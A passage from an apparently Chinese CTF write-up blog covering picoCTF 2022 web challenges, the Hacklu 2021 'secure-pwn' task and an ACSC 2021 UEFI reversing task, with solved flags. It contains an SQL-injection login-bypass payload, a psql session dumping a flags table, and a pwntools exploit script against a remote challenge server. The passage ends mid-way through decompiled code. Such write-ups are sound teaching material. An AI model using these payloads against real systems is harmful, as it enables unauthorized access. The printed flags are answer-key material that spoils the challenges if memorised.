class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/secret/assets/popup.js&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span>&gt;</span></span><br><span class="line">              Login with Social Media or Manually</span><br><span class="line">            <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vl&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;vl-innertext&quot;</span>&gt;</span>or<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fb btn&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-facebook fa-fw&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Login with Facebook</span><br><span class="line">              <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;twitter btn&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-twitter fa-fw&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Login with Twitter</span><br><span class="line">              <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;google btn&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-google fa-fw&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Login with Google+</span><br><span class="line">              <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hide-md-lg&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>Or sign in manually:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">                <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">name</span>=<span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">required</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">                <span class="attr">type</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">name</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">required</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;db&quot;</span> <span class="attr">value</span>=<span class="string">&quot;superhidden/xdfgwd.html&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">                <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;Thank you for the attempt but oops! try harder. better luck next time&#x27;)&quot;</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bottom-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: white&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Sign up<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: white&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Forgot password?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后访问一下<code>http://saturn.picoctf.net:50167/secret/hidden/superhidden/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;mycss.css&quot; /&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Finally. You found me. But can you see me&lt;/h1&gt;</span><br><span class="line">    &lt;h3 class=&quot;flag&quot;&gt;picoCTF&#123;succ3ss_@h3n1c@10n_51b260fe&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="SQL-Direct-web"><a href="#SQL-Direct-web" class="headerlink" title="SQL Direct-web"></a>SQL Direct-web</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">~ wsl@Conjuring</span><br><span class="line">&lt;2&gt;&gt;&gt; proxychains psql -h saturn.picoctf.net -p 53019 -U postgres pico</span><br><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">[proxychains] Strict chain  ...  192.168.10.3:49010  ...  saturn.picoctf.net:53019  ...  OK</span><br><span class="line">Password for user postgres:</span><br><span class="line">[proxychains] Strict chain  ...  192.168.10.3:49010  ...  saturn.picoctf.net:53019  ...  OK</span><br><span class="line">psql (12.9 (Ubuntu 12.9-0ubuntu0.20.04.1), server 14.2 (Debian 14.2-1.pgdg110+1))</span><br><span class="line">WARNING: psql major version 12, server major version 14.</span><br><span class="line">         Some psql features might not work.</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">pico=# help</span><br><span class="line">You are using psql, the command-line interface to PostgreSQL.</span><br><span class="line">Type:  \copyright for distribution terms</span><br><span class="line">       \h for help with SQL commands</span><br><span class="line">       \? for help with psql commands</span><br><span class="line">       \g or terminate with semicolon to execute query</span><br><span class="line">       \q to quit</span><br><span class="line">pico=# \list</span><br><span class="line">                                 List of databases</span><br><span class="line">   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges</span><br><span class="line">-----------+----------+----------+------------+------------+-----------------------</span><br><span class="line"> pico      | postgres | UTF8     | en_US.utf8 | en_US.utf8 |</span><br><span class="line"> postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 |</span><br><span class="line"> template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +</span><br><span class="line">           |          |          |            |            | postgres=CTc/postgres</span><br><span class="line"> template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +</span><br><span class="line">           |          |          |            |            | postgres=CTc/postgres</span><br><span class="line">(4 rows)</span><br><span class="line">pico=# \list</span><br><span class="line">                                 List of databases</span><br><span class="line">   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges</span><br><span class="line">-----------+----------+----------+------------+------------+-----------------------</span><br><span class="line"> pico      | postgres | UTF8     | en_US.utf8 | en_US.utf8 |</span><br><span class="line"> postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 |</span><br><span class="line"> template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +</span><br><span class="line">           |          |          |            |            | postgres=CTc/postgres</span><br><span class="line"> template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +</span><br><span class="line">           |          |          |            |            | postgres=CTc/postgres</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br><span class="line">pico=# \d</span><br><span class="line">         List of relations</span><br><span class="line"> Schema | Name  | Type  |  Owner</span><br><span class="line">--------+-------+-------+----------</span><br><span class="line"> public | flags | table | postgres</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">pico=# select * from flags</span><br><span class="line">pico-# ;</span><br><span class="line"> id | firstname | lastname  |                address</span><br><span class="line">----+-----------+-----------+----------------------------------------</span><br><span class="line">  1 | Luke      | Skywalker | picoCTF&#123;L3arN_S0m3_5qL_t0d4Y_0414477f&#125;</span><br><span class="line">  2 | Leia      | Organa    | Alderaan</span><br><span class="line">  3 | Han       | Solo      | Corellia</span><br><span class="line">(3 rows)</span><br></pre></td></tr></table></figure>

<h2 id="sqlilite-web"><a href="#sqlilite-web" class="headerlink" title="sqlilite-web"></a>sqlilite-web</h2><p>输入错误的admin和password</p>
<p>提示：Login failed.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br><span class="line">SQL query: SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>看到是通过sql查询的，应该可以sql注入</p>
<p>注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;&#x27; or `1=`1`</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/04/09/2022picoctfctf/" data-id="cuidLuPQt13YhQ8KMt-yzTD-9" data-title="picoctf2022" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021hackluctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/11/02/2021hackluctf/" class="article-date">
  <time class="dt-published" datetime="2021-11-02T03:07:10.000Z" itemprop="datePublished">2021-11-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/11/02/2021hackluctf/">Hacklu CTF 2021</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="secure-pwn"><a href="#secure-pwn" class="headerlink" title="secure-pwn"></a>secure-pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># HOST,PORT = &quot;127.0.0.1&quot;,8888</span></span><br><span class="line">HOST,PORT = <span class="string">&quot;flu.xxx&quot;</span>, <span class="number">20040</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"><span class="comment"># p = process(&#x27;qemu-arm -L /usr/arm-linux-gnueabi ./challenge.elf&#x27;, shell=True)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printf</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x420</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x1337</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x9999</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;you)\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x420</span>))</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3 parameters:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%d %d %d&#x27;</span> % (<span class="number">0x10570</span>,<span class="number">0x0</span>,<span class="number">0x0</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1337</span>))</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3 parameters:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%d %d %d&#x27;</span> % (<span class="number">0x000111FC</span>,<span class="number">0x22058</span>,<span class="number">0x0</span>))</span><br><span class="line">p.sendline(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;gl0bal_st0nkz_and_gl0bal_var1abl3&#125;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/11/02/2021hackluctf/" data-id="cuid5AV_KChmNeFH3lPFdAuxH" data-title="Hacklu CTF 2021" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021acscctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/09/23/2021acscctf/" class="article-date">
  <time class="dt-published" datetime="2021-09-23T03:07:10.000Z" itemprop="datePublished">2021-09-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/09/23/2021acscctf/">2021 ACSC CTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>逆向一个UEFI</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_240</span><span class="params">(EFI_HANDLE a1, <span class="keyword">struct</span> EFI_SYSTEM_TABLE *a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+0h] [rbp-490h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+8h] [rbp-488h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+10h] [rbp-480h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+18h] [rbp-478h]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-460h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">16</span>]; <span class="comment">// [rsp+40h] [rbp-450h] BYREF</span></span><br><span class="line">  __int64 v19[<span class="number">7</span>]; <span class="comment">// [rsp+50h] [rbp-440h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+88h] [rbp-408h] BYREF</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+250h] [rbp-240h] BYREF</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+258h] [rbp-238h] BYREF</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+260h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v24[<span class="number">2</span>]; <span class="comment">// [rsp+26Ch] [rbp-224h] BYREF</span></span><br><span class="line">  __int16 v25; <span class="comment">// [rsp+26Eh] [rbp-222h]</span></span><br><span class="line">  __int16 v26[<span class="number">38</span>]; <span class="comment">// [rsp+270h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v27; <span class="comment">// [rsp+478h] [rbp-18h]</span></span><br><span class="line">  __int64 Status; <span class="comment">// [rsp+480h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+48Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  (ST-&gt;ConOut-&gt;ClearScreen)(ST-&gt;ConOut-&gt;ClearScreen, ST-&gt;ConOut);</span><br><span class="line">  <span class="built_in">printf</span>(a1, a2, v3, <span class="string">L&quot;Input flag: &quot;</span>);</span><br><span class="line">  <span class="built_in">sub_1D43</span>(a1, a2, <span class="number">0x200uLL</span>, v26);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFE</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    (BS-&gt;WaitForEvent)(a1, a2, &amp;ST-&gt;ConIn-&gt;WaitForKey, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    (ST-&gt;ConIn-&gt;ReadKeyStroke)(a1, a2, v24, ST-&gt;ConIn);</span><br><span class="line">    <span class="keyword">if</span> ( v25 == <span class="number">0xD</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v26[i] = v25;</span><br><span class="line">    (ST-&gt;ConOut-&gt;OutputString)(a1, a2, &amp;v26[i], *(a3 + <span class="number">0x40</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(a1, a2, v4, <span class="string">L&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">LODWORD</span>(v5) = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">0x26</span> || <span class="built_in">sub_1122</span>(a1, a2, v26, <span class="string">L&quot;ACSC&#123;&quot;</span>, <span class="number">5LL</span>) || <span class="built_in">sub_1122</span>(a1, a2, &amp;v26[<span class="number">37</span>], <span class="string">&quot;&#125;&quot;</span>, <span class="number">1LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(a1, a2, v6, <span class="string">L&quot;Wrong!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v23 = <span class="built_in">sub_20D4</span>(a1, a2, v6, <span 